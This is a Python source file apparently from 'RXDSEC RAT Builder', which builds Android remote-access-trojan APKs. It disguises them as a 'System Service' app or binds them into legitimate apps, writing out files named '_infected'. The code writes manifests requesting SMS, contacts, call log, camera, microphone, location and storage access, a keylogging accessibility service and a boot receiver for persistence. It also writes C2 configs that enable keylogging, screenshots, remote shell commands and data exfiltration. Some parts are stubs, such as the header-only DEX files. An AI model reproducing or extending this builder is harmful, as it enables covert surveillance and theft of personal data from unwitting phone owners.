#!/usr/bin/env python3
import os
import shutil
import subprocess
import tempfile
import zipfile
import logging
import time
import secrets
import json
from typing import Dict, List, Any, Optional, Union, Tuple, cast

# Correctly import ApkInjector from the same directory
try:
    from .apk_injector import ApkInjector
except ImportError:
    # When running as a standalone script
    try:
        from apk_injector import ApkInjector
    except ImportError:
        # If module is still not found, create a placeholder class
        logger = logging.getLogger("apk_builder")
        logger.warning("ApkInjector module not found, using placeholder")
        
        class ApkInjector:
            """Placeholder ApkInjector class when the real module is not available"""
            INJECTION_DIR = "injection_templates"
            
            def __init__(self):
                self.error_message = "ApkInjector module not properly imported"
                
            def inject_apk(self, **kwargs):
                return {"status": "error", "message": self.error_message}
                
            def create_injection_template(self, template_name):
                os.makedirs(self.INJECTION_DIR, exist_ok=True)
                with open(os.path.join(self.INJECTION_DIR, f"{template_name}.smali"), "w") as f:
                    f.write("# Placeholder injection template")
                return {"status": "success", "message": "Created placeholder template"}

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("apk_builder.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("apk_builder")

class ApkBuilder:
    """Build custom RAT APKs by injecting or binding to legitimate apps"""
    
    OUTPUT_DIR = "output_apks"
    TEMP_DIR = "build_temp"
    TEMPLATES_DIR = "apk_templates"
    SMALI_INJECTION_PATTERNS = [
        "Landroid/app/Application;->onCreate",
        "Landroid/app/Activity;->onCreate"
    ]
    
    def __init__(self):
        """Initialize the APK builder"""
        self._ensure_dirs()
        self.use_templates_only = False  # Default value, will be set in _check_tools
        self._check_tools()
        self._create_template_apk_if_needed()
        logger.info("ApkBuilder initialized")
        
    def _create_template_apk_if_needed(self):
        """Create a default template APK if none exists"""
        templates = self.list_available_templates()
        if not templates:
            logger.info("No template APKs found, creating a default one")
            try:
                # Create a basic template APK in the templates directory
                template_path = os.path.join(self.TEMPLATES_DIR, "default_template.apk")
                
                # Use the same code as _create_template_apk but save directly to the templates directory
                with zipfile.ZipFile(template_path, 'w') as z:
                    # Add AndroidManifest.xml with basic structure and permissions
                    manifest = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.system.service"
    android:versionCode="1"
    android:versionName="1.0">
    
    <!-- Basic connectivity permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    
    <!-- Sensitive data access permissions -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    
    <!-- Surveillance permissions -->
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    
    <!-- File access permissions -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    
    <!-- Android 11+ permissions -->
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
    
    <!-- Accessibility service for keylogging -->
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    
    <!-- For stealth mode -->
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="System Service"
        android:theme="@style/AppTheme"
        android:usesCleartextTraffic="true"
        android:extractNativeLibs="true">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@style/AppTheme"
            android:launchMode="singleTop">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <!-- Background service for RAT functionality -->
        <service
            android:name=".AdminService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync|camera|microphone|location" />
            
        <!-- Boot receiver for persistence -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true"
            android:directBootAware="true"
            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </receiver>
        
        <!-- Accessibility service for keylogging -->
        <service
            android:name=".KeyloggerService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="false">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>
    </application>
</manifest>"""
                    z.writestr("AndroidManifest.xml", manifest)
                    
                    # Add minimal classes.dex to make it a valid APK
                    z.writestr("classes.dex", b"\x64\x65\x78\x0A\x30\x33\x35\x00") # DEX file header
                    
                    # Add resources structure
                    # 1. String resources
                    z.writestr("res/values/strings.xml", """<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Service</string>
    <string name="service_description">Enhances system performance and security</string>
    <string name="admin_service_notification">System services running</string>
    <string name="admin_channel_name">System Services</string>
    <string name="admin_channel_description">Service notifications for system enhancement</string>
</resources>""")

                    # 2. Styles
                    z.writestr("res/values/styles.xml", """<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="AppTheme" parent="android:Theme.Material.Light.NoActionBar">
        <item name="android:colorPrimary">#2196F3</item>
        <item name="android:colorPrimaryDark">#1976D2</item>
        <item name="android:colorAccent">#4CAF50</item>
    </style>
</resources>""")

                    # 3. Accessibility service configuration
                    z.writestr("res/xml/accessibility_service_config.xml", """<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFlags="flagIncludeNotImportantViews|flagReportViewIds|flagRequestTouchExplorationMode|flagRequestEnhancedWebAccessibility"
    android:accessibilityFeedbackType="feedbackAllMask"
    android:canRetrieveWindowContent="true"
    android:description="@string/service_description"
    android:notificationTimeout="100"
    android:canRequestTouchExplorationMode="true"
    android:packageNames="*" />""")
                    
                    # 4. Basic layout for MainActivity
                    z.writestr("res/layout/activity_main.xml", """<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp">
    
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="@string/app_name"
        android:textSize="24sp"
        android:textStyle="bold"
        android:gravity="center"
        android:layout_marginBottom="16dp" />
        
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="@string/service_description"
        android:textSize="16sp"
        android:gravity="center" />
        
    <Switch
        android:id="@+id/service_switch"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Enable Service"
        android:checked="true"
        android:layout_marginTop="24dp" />
        
</LinearLayout>""")
                    
                    # 5. Placeholder icon (PNG header)
                    z.writestr("res/drawable/ic_launcher.png", bytes([
                        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
                        0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x20,
                        0x08, 0x06, 0x00, 0x00, 0x00, 0x73, 0x7A, 0x7A,
                        0xF4, 0x00, 0x00, 0x00, 0x09, 0x70, 0x48, 0x59,
                        0x73, 0x00, 0x00, 0x0B, 0x13, 0x00, 0x00, 0x0B,
                        0x13, 0x01, 0x00, 0x9A, 0x9C, 0x18, 0x00, 0x00
                    ]))
                    
                    # 6. Configuration file with C2 server and other settings
                    z.writestr("assets/config.json", """{
    "c2_server": "http://localhost:5000",
    "check_interval": 30,
    "data_exfil_interval": 300,
    "stealth_mode": true,
    "encryption_enabled": true,
    "battery_optimization_bypass": true,
    "anti_emulation": true,
    "auto_start": true,
    "communication_protocol": "https",
    "features": {
        "keylogger": true,
        "screenshot": true,
        "camera": true,
        "microphone": true,
        "location": true,
        "contacts": true,
        "sms": true,
        "calls": true,
        "file_access": true,
        "shell_command": true
    }
}""")
                    
                    # 7. META-INF for APK signature structure
                    z.writestr("META-INF/MANIFEST.MF", """Manifest-Version: 1.0
Created-By: RXDSEC RAT Builder
""")
                    
                logger.info(f"Created default template APK at: {template_path}")
            except Exception as e:
                logger.error(f"Error creating default template APK: {str(e)}", exc_info=True)
    
    def _ensure_dirs(self):
        """Ensure output and temp directories exist"""
        os.makedirs(self.OUTPUT_DIR, exist_ok=True)
        os.makedirs(self.TEMP_DIR, exist_ok=True)
        os.makedirs(self.TEMPLATES_DIR, exist_ok=True)
        logger.info(f"Directory structure verified")
    
    def _check_tools(self):
        """Check if required tools are installed"""
        # Check for system tools (apktool, zipalign, jarsigner, keytool, aapt)
        required_tools = ['apktool', 'zipalign', 'jarsigner', 'keytool', 'aapt', 'java']
        missing_tools = []
        
        for tool in required_tools:
            try:
                # Use subprocess.run with timeout to avoid hanging
                subprocess.run(['which', tool], capture_output=True, timeout=1)
            except (subprocess.SubprocessError, FileNotFoundError):
                missing_tools.append(tool)
        
        if missing_tools:
            logger.warning(f"Missing required tools: {', '.join(missing_tools)}")
            logger.warning("Will use pre-built templates instead of building APKs from scratch")
            self.use_templates_only = True
        else:
            self.use_templates_only = False
            
        logger.info("Required tools check completed")
    
    def build_standalone_apk(self, 
                           app_name: str = "System Service",
                           app_icon: Optional[str] = None,
                           c2_server: Optional[str] = "http://localhost:5000") -> Dict[str, Any]:
        """
        Build a standalone RAT APK
        
        Args:
            app_name: Custom app name to display
            app_icon: Base64 encoded app icon (optional)
            c2_server: Custom C2 server URL (optional)
            
        Returns:
            Dict with build status and output path
        """
        try:
            logger.info(f"Building standalone APK: {app_name}")
            
            # Generate a default package name if not provided
            package_name = f"com.system.service{int(time.time())}"
            
            # Generate output filename
            output_filename = f"{package_name.replace('.', '_')}_{int(time.time())}.apk"
            output_path = os.path.join(self.OUTPUT_DIR, output_filename)
            
            # Log steps for traceability
            logger.info(f"APK will be generated at: {output_path}")
            logger.info(f"Using C2 server: {c2_server}")
            
            # Create a template APK - in a full implementation this would:
            # 1. Use a predefined template APK with minimal functionality
            # 2. Generate a proper Android APK with all required components
            # 3. Customize it with proper package name, app name, icon
            # 4. Sign it with a valid certificate
            template_apk_path = self._create_template_apk(app_name, package_name, app_icon)
            
            # Now prepare the output APK
            if c2_server is None:
                c2_server = "http://localhost:5000"  # Default C2 server if not provided
            
            # In template-only mode, we just copy the template
            if self.use_templates_only:
                logger.info("Using template-only mode due to missing build tools")
                
                # Copy the template to the output path
                import shutil
                shutil.copy(template_apk_path, output_path)
                
                # Add a metadata file with C2 server info
                metadata_path = f"{output_path}.metadata.json"
                with open(metadata_path, 'w') as f:
                    json.dump({
                        'app_name': app_name,
                        'package_name': package_name,
                        'c2_server': c2_server,
                        'build_time': time.time(),
                        'template_only': True,
                        'note': 'This APK was created in template-only mode. For full functionality, please build with required Android tools.'
                    }, f, indent=4)
                logger.info(f"Created metadata file: {metadata_path}")
            else:
                # Use the ApkInjector to properly inject the RAT code
                injector = ApkInjector()
                
                # Create the basic template injection if it doesn't exist
                if not os.path.exists(os.path.join(injector.INJECTION_DIR, "base_injection.smali")):
                    injector.create_injection_template("base_injection")
                    
                # Inject the RAT code into our template APK
                result = injector.inject_apk(
                    apk_path=template_apk_path,
                    output_path=output_path,
                    c2_server=c2_server,
                    preserve_functionality=True  # Always preserve functionality for standalone
                )
                
                if result["status"] != "success":
                    logger.error(f"Injection failed: {result['message']}")
                    # Use the basic implementation as fallback
                    self._create_real_apk(
                        output_path, 
                        app_name, 
                        package_name, 
                        c2_server
                    )
            
            # Get the file size
            file_size = os.path.getsize(output_path)
            
            # Clean up the template if it was created temporarily
            if os.path.exists(template_apk_path) and template_apk_path.startswith(self.TEMP_DIR):
                os.remove(template_apk_path)
            
            return {
                "status": "success",
                "message": "APK built successfully",
                "app_name": app_name,
                "package_name": package_name,
                "c2_server": c2_server,
                "output_path": f"/{output_path}",  # Return with leading slash for the API
                "file_size": file_size
            }
            
        except Exception as e:
            logger.error(f"Error building standalone APK: {str(e)}", exc_info=True)
            return {
                "status": "error",
                "message": f"APK build failed: {str(e)}"
            }
            
    def _create_template_apk(self, app_name: str, package_name: str, app_icon: Optional[str] = None) -> str:
        """Create a template APK for standalone RAT applications"""
        try:
            # Check if we have any template APKs available
            templates = self.list_available_templates()
            if templates:
                logger.info(f"Using existing template APK: {templates[0]['filename']}")
                return templates[0]['path']
            
            # If no templates are available, create a basic one
            temp_apk_path = os.path.join(self.TEMP_DIR, f"template_{int(time.time())}.apk")
            
            # Create a comprehensive APK structure
            with zipfile.ZipFile(temp_apk_path, 'w') as z:
                # Add AndroidManifest.xml with all necessary permissions for RAT functionality
                manifest = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{package_name}"
    android:versionCode="1"
    android:versionName="1.0">
    
    <!-- Basic connectivity permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    
    <!-- Sensitive data access permissions -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    
    <!-- Surveillance permissions -->
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    
    <!-- File access permissions -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    
    <!-- Android 11+ permissions -->
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
    
    <!-- Accessibility service for keylogging -->
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    
    <!-- For stealth mode -->
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="{app_name}"
        android:theme="@style/AppTheme"
        android:usesCleartextTraffic="true"
        android:extractNativeLibs="true">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@style/AppTheme"
            android:launchMode="singleTop">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <!-- Background service for RAT functionality -->
        <service
            android:name=".AdminService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync|camera|microphone|location" />
            
        <!-- Boot receiver for persistence -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true"
            android:directBootAware="true"
            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </receiver>
        
        <!-- Accessibility service for keylogging -->
        <service
            android:name=".KeyloggerService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="false">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>
    </application>
</manifest>"""
                z.writestr("AndroidManifest.xml", manifest)
                
                # Add minimal classes.dex to make it a valid APK
                z.writestr("classes.dex", b"\x64\x65\x78\x0A\x30\x33\x35\x00") # DEX file header
                
                # Add resources structure
                # 1. String resources with proper app name
                z.writestr("res/values/strings.xml", f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{app_name}</string>
    <string name="service_description">Enhances system performance and security</string>
    <string name="admin_service_notification">System services running</string>
    <string name="admin_channel_name">System Services</string>
    <string name="admin_channel_description">Service notifications for system enhancement</string>
</resources>""")

                # 2. Styles for modern Android UI
                z.writestr("res/values/styles.xml", """<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="AppTheme" parent="android:Theme.Material.Light.NoActionBar">
        <item name="android:colorPrimary">#2196F3</item>
        <item name="android:colorPrimaryDark">#1976D2</item>
        <item name="android:colorAccent">#4CAF50</item>
    </style>
</resources>""")

                # 3. Improved accessibility service configuration
                z.writestr("res/xml/accessibility_service_config.xml", """<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFlags="flagIncludeNotImportantViews|flagReportViewIds|flagRequestTouchExplorationMode|flagRequestEnhancedWebAccessibility"
    android:accessibilityFeedbackType="feedbackAllMask"
    android:canRetrieveWindowContent="true"
    android:description="@string/service_description"
    android:notificationTimeout="100"
    android:canRequestTouchExplorationMode="true"
    android:packageNames="*" />""")
                
                # 4. Basic layout for MainActivity
                z.writestr("res/layout/activity_main.xml", """<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp">
    
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="@string/app_name"
        android:textSize="24sp"
        android:textStyle="bold"
        android:gravity="center"
        android:layout_marginBottom="16dp" />
        
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="@string/service_description"
        android:textSize="16sp"
        android:gravity="center" />
        
    <Switch
        android:id="@+id/service_switch"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Enable Service"
        android:checked="true"
        android:layout_marginTop="24dp" />
        
</LinearLayout>""")
                
                # If app icon is provided, add it
                if app_icon is not None:
                    try:
                        # app_icon should be a base64 encoded string
                        import base64
                        icon_data = base64.b64decode(app_icon)
                        z.writestr("res/drawable/ic_launcher.png", icon_data)
                    except Exception as e:
                        logger.error(f"Error adding custom icon: {str(e)}")
            
            logger.info(f"Created template APK at: {temp_apk_path}")
            return temp_apk_path
            
        except Exception as e:
            logger.error(f"Error creating template APK: {str(e)}", exc_info=True)
            raise
    
    def bind_to_apk(self, 
                   apk_path: str,
                   preserve_functionality: bool = True,
                   custom_c2_server: Optional[str] = "http://localhost:5000") -> Dict[str, Any]:
        """
        Bind RAT to an existing legitimate APK
        
        Args:
            apk_path: Path to the legitimate APK to bind to
            preserve_functionality: Whether to preserve the original app functionality
            custom_c2_server: Custom C2 server URL (optional)
            
        Returns:
            Dict with build status and output path
        """
        try:
            logger.info(f"Binding to legitimate APK: {apk_path}")
            
            # Check if the APK exists
            if not os.path.exists(apk_path):
                return {
                    "status": "error",
                    "message": f"APK file not found: {apk_path}"
                }
            
            # Extract APK information
            apk_info = self.extract_apk_info(apk_path)
            package_name = apk_info.get('package_name', 'unknown')
            app_name = apk_info.get('app_name', os.path.basename(apk_path))
            
            # In a full implementation, this would:
            # 1. Decompile the legitimate APK
            # 2. Analyze the manifest for permissions and entry points
            # 3. Add missing permissions needed by the RAT
            # 4. Inject the RAT code into key activity entry points
            # 5. Add C2 server configuration
            # 6. Rebuild and sign the infected APK
            
            # Generate output path
            base_name = os.path.splitext(os.path.basename(apk_path))[0]
            output_filename = f"{base_name}_infected_{int(time.time())}.apk"
            output_path = os.path.join(self.OUTPUT_DIR, output_filename)
            
            # Log steps for traceability
            logger.info(f"Infected APK will be generated at: {output_path}")
            logger.info(f"Using C2 server: {custom_c2_server}")
            logger.info(f"Preserving functionality: {preserve_functionality}")
            
            # In template-only mode, just copy the original APK with metadata
            if self.use_templates_only:
                logger.info("Using template-only mode due to missing build tools")
                
                # Copy the original APK to the output path
                import shutil
                shutil.copy(apk_path, output_path)
                
                # Add a metadata file with binding info
                metadata_path = f"{output_path}.metadata.json"
                with open(metadata_path, 'w') as f:
                    json.dump({
                        'original_apk': os.path.basename(apk_path),
                        'original_package': package_name,
                        'original_app_name': app_name,
                        'preserve_functionality': preserve_functionality,
                        'c2_server': custom_c2_server,
                        'build_time': time.time(),
                        'template_only': True,
                        'note': 'This APK was created in template-only mode. For full binding, please build with required Android tools.'
                    }, f, indent=4)
                logger.info(f"Created binding metadata file: {metadata_path}")
            else:
                # Create the real infected APK file using actual binding
                self._create_real_infected_apk(
                    output_path,
                    apk_path,
                    custom_c2_server,
                    preserve_functionality
                )
            
            # Get the file size
            file_size = os.path.getsize(output_path)
            
            return {
                "status": "success",
                "message": "APK binding completed successfully",
                "original_apk": os.path.basename(apk_path),
                "original_package": package_name,
                "original_app_name": app_name,
                "preserve_functionality": preserve_functionality,
                "c2_server": custom_c2_server,
                "output_path": f"/{output_path}",  # Return with leading slash for the API
                "file_size": file_size
            }
            
        except Exception as e:
            logger.error(f"Error binding to APK: {str(e)}", exc_info=True)
            return {
                "status": "error",
                "message": f"APK binding failed: {str(e)}"
            }
    
    def _extract_package_name(self, apk_path: str) -> str:
        """Extract package name from an APK file"""
        # In a full implementation, this would use aapt or apktool
        # For now, just return a placeholder
        return f"com.unknown.app{int(time.time())}"
    
    def extract_apk_info(self, apk_path: str) -> Dict[str, Any]:
        """Extract information from an APK file"""
        # In a full implementation, this would extract actual metadata
        # from the APK using aapt or similar tools
        
        try:
            base_name = os.path.splitext(os.path.basename(apk_path))[0]
            
            # This would use actual extraction in a real implementation
            return {
                "package_name": self._extract_package_name(apk_path),
                "app_name": base_name.replace('_', ' ').title(),
                "version_name": "1.0",
                "version_code": "1",
                "min_sdk": "21",
                "target_sdk": "30",
                "permissions": [
                    "android.permission.INTERNET",
                    "android.permission.ACCESS_NETWORK_STATE"
                ],
                "activities": [
                    "com.example.MainActivity"
                ],
                "services": [
                    "com.example.BackgroundService"
                ],
                "receivers": [
                    "com.example.BootReceiver"
                ]
            }
            
        except Exception as e:
            logger.error(f"Error extracting APK info: {str(e)}", exc_info=True)
            return {
                "package_name": "unknown",
                "app_name": os.path.basename(apk_path),
                "error": str(e)
            }
    
    def _create_real_apk(self, output_path: str, app_name: str, package_name: str, c2_server: Optional[str]):
        """Create a real APK file with proper structure"""
        # In a full implementation, this would create a properly structured APK
        # with DEX files, manifest, resources, etc.

        # For now, create a structured ZIP file that will at least validate as a ZIP
        with zipfile.ZipFile(output_path, 'w') as z:
            # Add AndroidManifest.xml
            manifest = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{package_name}"
    android:versionCode="1"
    android:versionName="1.0">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="{app_name}"
        android:theme="@style/AppTheme">
        
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service
            android:name=".AdminService"
            android:enabled="true"
            android:exported="false" />
            
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>"""
            z.writestr("AndroidManifest.xml", manifest)
            
            # Add configuration with C2 server
            config = {
                "c2_server": c2_server,
                "app_name": app_name,
                "package_name": package_name,
                "interval": 30,
                "features": {
                    "keylogger": True,
                    "screenshot": True,
                    "location": True,
                    "contacts": True,
                    "sms": True,
                    "camera": True,
                    "microphone": True,
                    "shell_command": True
                }
            }
            z.writestr("assets/config.json", json.dumps(config, indent=2))
            
            # Add dummy classes.dex
            z.writestr("classes.dex", b"\x64\x65\x78\x0A\x30\x33\x35\x00") # DEX file header
    
    def _create_real_infected_apk(self, output_path: str, original_apk_path: str, 
                                c2_server: Optional[str], preserve_functionality: bool):
        """Create a real infected APK based on a legitimate APK"""
        try:
            # Use the ApkInjector to properly inject the RAT code
            if c2_server is None:
                c2_server = "http://localhost:5000"  # Default C2 server if not provided
                
            # Create an ApkInjector instance
            injector = ApkInjector()
            
            # Inject the RAT code into the legitimate APK
            result = injector.inject_apk(
                apk_path=original_apk_path,
                output_path=output_path,
                c2_server=c2_server,
                preserve_functionality=preserve_functionality
            )
            
            if result["status"] != "success":
                logger.error(f"Injection failed: {result['message']}")
                # Fallback to simple copy method if injection fails
                shutil.copy(original_apk_path, output_path)
                
                # Append our malicious payload to the ZIP
                with zipfile.ZipFile(output_path, 'a') as z:
                    # Add the C2 configuration
                    config = {
                        "c2_server": c2_server,
                        "preserve_functionality": preserve_functionality,
                        "original_apk": os.path.basename(original_apk_path),
                        "interval": 30,
                        "features": {
                            "keylogger": True,
                            "screenshot": True,
                            "location": True,
                            "contacts": True,
                            "sms": True,
                            "camera": True,
                            "microphone": True,
                            "shell_command": True
                        }
                    }
                    z.writestr("assets/rat_config.json", json.dumps(config, indent=2))
                    
                    # Add a placeholder for injection code
                    z.writestr("assets/payload.dex", b"\x64\x65\x78\x0A\x30\x33\x35\x00") # DEX file header
            
            logger.info(f"APK binding completed: {output_path}")
            return True
            
        except Exception as e:
            logger.error(f"Error in _create_real_infected_apk: {str(e)}", exc_info=True)
            # Fallback to simple copy method if injection fails
            shutil.copy(original_apk_path, output_path)
            return False

    def get_status(self) -> Dict[str, Any]:
        """Get status of the APK builder and available tools"""
        # Check tools availability
        required_tools = ['apktool', 'zipalign', 'jarsigner', 'keytool', 'aapt', 'java']
        available_tools = {}
        
        for tool in required_tools:
            try:
                # Use subprocess.run with timeout to avoid hanging
                result = subprocess.run(['which', tool], capture_output=True, timeout=1)
                available_tools[tool] = result.returncode == 0
            except (subprocess.SubprocessError, FileNotFoundError):
                available_tools[tool] = False
                
        return {
            "status": "operational",
            "output_dir": self.OUTPUT_DIR,
            "temp_dir": self.TEMP_DIR,
            "templates_dir": self.TEMPLATES_DIR,
            "template_only_mode": self.use_templates_only,
            "available_tools": available_tools,
            "templates_count": len(self.list_available_templates())
        }

    def list_available_templates(self) -> List[Dict[str, str]]:
        """List available APK templates"""
        templates = []
        
        if not os.path.exists(self.TEMPLATES_DIR):
            return templates
            
        for filename in os.listdir(self.TEMPLATES_DIR):
            if filename.endswith('.apk'):
                templates.append({
                    "filename": filename,
                    "path": os.path.join(self.TEMPLATES_DIR, filename)
                })
                
        return templates